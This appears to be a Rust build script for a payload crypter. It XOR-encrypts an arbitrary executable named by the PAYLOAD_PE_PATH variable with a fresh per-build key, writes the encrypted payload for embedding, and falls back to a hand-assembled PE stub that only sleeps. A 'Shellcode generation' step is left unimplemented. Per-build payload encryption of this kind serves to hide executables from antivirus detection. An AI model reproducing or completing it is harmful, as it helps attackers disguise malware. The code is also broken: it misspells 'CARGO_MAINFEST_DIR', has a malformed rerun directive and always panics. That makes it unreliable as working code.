 use std::env;
use std::fs;
use std::path::PathBuf;

fn main() {
    let our_dir = env::var("OUT_DIR").unwrap();
    let out_path = PathBuf::from(&our_dir);

    let key = generate_build_key();
    let key_code = format!("const XOR_KEY: [u8; {}] = {:?};", key.len(), key);
    fs::write(out_path.join("xor_key.rs"), key_code).unwrap();

    let pe_data = if let Ok(pe_path) = env::var("PAYLOAD_PE_PATH") {
        fs::read(&pe_path).unwrap_or_default()
    } else {
        let crate_root = PathBuf::from(env::var("CARGO_MAINFEST_DIR").unwrap());
        let dummy_path = crate_root.join("dummy.exe");
        if dummy_path.exists() {
            println!("cargo:rerun-if_changed={}", dummy_path.display());
            fs::read(&dummy_path).unwrap_or_else(|_| generate_ghost_stub())
        } else {
            generate_ghost_stub()
        }
    };

    let encrypted_pe = xor_encrypt(&pe_data, &key);
    fs::write(out_path.join("payload.enc"), &encrypted_pe).unwrap();

    unimplemented!("TODO: Shellcode generation")
}

fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

fn generate_build_key() -> Vec<u8> {
    use std::time::SystemTime;
    let seed = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_nanos();

    let mut key = Vec::with_capacity(32);
    let mut state = seed;
    for _ in 0..32 {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        key.push((state >> 33) as u8);
    }

    key
}


fn generate_ghost_stub() -> Vec<u8> {
    let mut pe = vec![0u8; 0x400];

    // DOS Header (0x000x3F)
    w16(&mut pe, 0x00, 0x5A4D);            // e_magic = "MZ"
    w32(&mut pe, 0x3C, 0x80);              // e_lfanew -> PE header

    // PE Signature (0x80)
    w32(&mut pe, 0x80, 0x00004550);       // "PE\0\0"

    // COFF File Header (0x84, 20 bytes)
    w16(&mut pe, 0x84, 0x8664);             // Machine = AMD64
    w16(&mut pe, 0x86, 1);                  // NumberOfSections
    w32(&mut pe, 0x88, 0x6A6D3700);         // TimeDateStamp (August 1, 2026)
    w16(&mut pe, 0x94, 0xF0);               // SizeOfOptionalHeader = 240
    w16(&mut pe, 0x96, 0x0022);             // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    // Optional Header PE32+ (0x98, 240 bytes)
    w16(&mut pe, 0x98, 0x020B);             // Magic = PE32+
    pe[0x9A] = 14; pe[0x9B] = 36;           // LinkerVersion 14.36 (MSVC-like)
    w32(&mut pe, 0x9C, 0x200);              // SizeOfCode
    w32(&mut pe, 0xA0, 0x200);              // SizeOfInitializedData
    w32(&mut pe, 0xA8, 0x1000);             // AddressOfEntryPoint
    w32(&mut pe, 0xAC, 0x1000);             // BaseOfCode
    w64(&mut pe, 0xB0, 0x0000000140000000); // ImageBase
    w32(&mut pe, 0xB8, 0x1000);             // SectionAlignment
    w32(&mut pe, 0xBC, 0x0200);             // FileAlignment
    w16(&mut pe, 0xC0, 6);                  // MajorOperatingSystemVersion
    w16(&mut pe, 0xC8, 6);                  // MajorSubsystemVersion
    w32(&mut pe, 0xD0, 0x2000);             // SizeOfImage
    w32(&mut pe, 0xD4, 0x0200);             // SizeOfHeaders
    w16(&mut pe, 0xDC, 3);                  // Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI
    w16(&mut pe, 0xDE, 0x8160);             // DYNAMIC_BASE|NX_COMPAT|TSA|HIGH_ENTROPY_VA
    w64(&mut pe, 0xE0, 0x00100000);         // SizeOfStackReserve
    w64(&mut pe, 0xE8, 0x1000);             // SizeOfStackCommit
    w64(&mut pe, 0xF0, 0x00100000);         // SizeOfHeapReserve
    w64(&mut pe, 0xF8, 0x1000);             // SizeOfHeapCommit
    w32(&mut pe, 0x104, 16);                // NumberOfRvaAndSizes

    // DataDirectory[1] = Import Directory  (offset 0x108 + 1*8 = 0x110)
    w32(&mut pe, 0x110, 0x1020);           // VirtualAddress
    w32(&mut pe, 0x114, 40);               // Size (1 entry + null)

    // DataDirectory[12] = IAT              (offset 0x108 + 12*8 = 0x168)
    w32(&mut pe, 0x168, 0x1060);           // VirtualAddress
    w32(&mut pe, 0x16C, 16);               // Size

    // Section Header: .text (0x188, 40 bytes)
    pe[0x188..0x190].copy_from_slice(b".text\0\0\0");
    w32(&mut pe, 0x190, 0xA0);             // VirtualSize
    w32(&mut pe, 0x194, 0x1000);           // VirtualAddress
    w32(&mut pe, 0x198, 0x0200);           // SizeOfRawData
    w32(&mut pe, 0x19C, 0x0200);           // PointerToRawData
    w32(&mut pe, 0x1AC, 0x6000_0020);      // CODE | EXECUTE | READ

    // .text section data (file 0x200, RVA 0x1000)
    //
    // Entry point at RVA 0x1000:
    //   sub  rsp, 0x28              ; shadow space + alignment
    //   .loop:
    //   mov  ecx, 0xFFFFFFFF        ; INFINITE
    //   call [rip + 0x51]           ; IAT[0] -> Sleep
    //   jmp  .loop
    //
    // RIP after call = 0x100F, IAT at 0x1060 -> disp = 0x51
    pe[0x200..0x211].copy_from_slice(&[
        0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
        0xB9, 0xFF, 0xFF, 0xFF, 0xFF,       // mov ecx, -1
        0xFF, 0x15, 0x51, 0x00, 0x00, 0x00, // call [rip+0x51]
        0xEB, 0xF3,                         // jmp .loop
    ]);

    // Import Directory Table at RVA 0x1020 (file 0x220)
    // Entry 0 (20 bytes):
    //   OriginalFirstThunk -> ILT at 0x1070
    //   TimeDateStamp      = 0
    //   ForwarderChain     = 0
    //   Name               -> "kernel32.dll" at 0x1080
    //   FirstThunk         -> IAT at 0x1060
    w32(&mut pe, 0x220, 0x1070);           // OriginalFirstThunk
    w32(&mut pe, 0x22C, 0x1080);           // Name
    w32(&mut pe, 0x230, 0x1060);           // FirstThunk
    // Entry 1: null terminator

    // IAT at RVA 0x1060 (file 0x260): points to Hint/Name
    w64(&mut pe, 0x260, 0x1090);

    // ILT at RVA 0x1070 (file 0x270): same target
    w64(&mut pe, 0x270, 0x1090);

    // DLL name at RVA 0x1080 (file 0x280)
    pe[0x280..0x28D].copy_from_slice(b"kernel32.dll\0");

    // Hint/Name at RVA 0x1090 (file 0x290): Hint=0, Name="Sleep"
    // Hint is 2 bytes at 0x290
    pe[0x292..0x298].copy_from_slice(b"Sleep\0");

    pe
}

fn w16(buf: &mut [u8], off: usize, v: u16) {
    buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
}
fn w32(buf: &mut [u8], off: usize, v: u32) {
    buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
}
fn w64(buf: &mut [u8], off: usize, v: u64) {
    buf[off..off + 8].copy_from_slice(&v.to_le_bytes());
}
